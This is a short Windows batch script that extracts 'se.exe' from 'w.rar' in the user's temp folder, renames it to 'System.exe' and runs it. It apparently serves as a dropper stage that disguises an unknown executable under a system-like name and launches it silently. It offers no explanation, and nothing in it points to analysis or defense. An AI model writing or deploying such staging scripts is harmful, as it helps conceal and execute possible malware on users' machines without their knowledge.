set path=C:\Program Files\WinRAR
cd %localappdata%\\temp\\
unrar e w.rar
move %localappdata%\\temp\\se.exe %localappdata%\\temp\\System.exe
start %localappdata%\\temp\\System.exe
